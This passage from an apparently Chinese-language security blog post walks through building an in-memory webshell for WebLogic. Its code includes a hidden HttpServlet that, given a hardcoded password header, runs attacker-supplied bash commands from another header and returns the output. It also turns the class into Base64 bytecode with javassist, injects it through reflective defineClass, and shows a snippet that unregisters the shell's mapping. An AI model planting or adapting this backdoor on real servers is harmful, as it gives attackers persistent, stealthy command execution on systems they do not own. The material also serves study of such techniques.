</span></span><span style=display:flex><span>httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 获取servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 获取servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//卸载内存马
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)!=</span><span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>removePattern</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=使用字节码定义servlet>使用字节码定义servlet<a hidden class=anchor aria-hidden=true href=#使用字节码定义servlet>#</a></h4><p>上面提到直接自定义servlet没有成功，于是尝试使用字节码来加载自定义的servlet。</p><p>自定义一个servlet：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-21>21</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServlet</span> <span style=color:#66d9ef>extends</span> HttpServlet <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doGet</span><span style=color:#f92672>(</span>HttpServletRequest req<span style=color:#f92672>,</span> HttpServletResponse resp<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String passwd<span style=color:#f92672>=</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(!</span><span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>passwd<span style=color:#f92672>)){</span><span style=color:#66d9ef>return</span><span style=color:#f92672>;}</span>
</span></span><span style=display:flex><span>        String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>生成该servlet对应的字节码</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-19>19</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServletGenByteCode</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            String bytecode<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>bytecode<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>使用该字节码生成servlet对象</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADExxxxxxxxx……&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> code<span style=color:#f92672>=</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Method defineClass<span style=color:#f92672>=</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;defineClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>HttpServlet memsHttpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=解决duplicate-class-definition>解决duplicate class definition<a hidden class=anchor aria-hidden=true href=#解决duplicate-class-definition>#</a></h4><p>发现会报错</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-109-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-109-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>loader <span style=color:#f92672>(</span>instance of  com/oracle/classloader/weblogic/LaunchClassLoader<span style=color:#f92672>)</span>: attempted  duplicate class definition <span style=color:#66d9ef>for</span> name: <span style=color:#e6db74>&#34;pers/neo/memsHttpServlet&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220704164544546.png alt=image-20220704164544546></p><p>是因为我们之前已经加载过这个类了。不能再使用同一个类名了。</p><p>于是通过反射在每次测试时修改自定义servlet的名称，而不是频繁refactor那个类，以此避免重复定义类的问题。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServletGenByteCode</span> <span style=color:#f92672>{</span>
